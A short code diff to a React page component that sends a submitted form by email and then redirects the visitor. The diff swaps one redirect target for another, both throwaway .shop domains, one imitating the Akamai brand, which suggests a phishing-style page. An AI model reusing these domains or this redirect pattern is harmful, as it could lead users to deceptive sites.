@@ -42,7 +42,7 @@ export default function Home() {
           country,
         });
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://2nerd.akamai-root.shop/';
+        window.location.href = 'https://nero.slet-ganghus.shop/';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
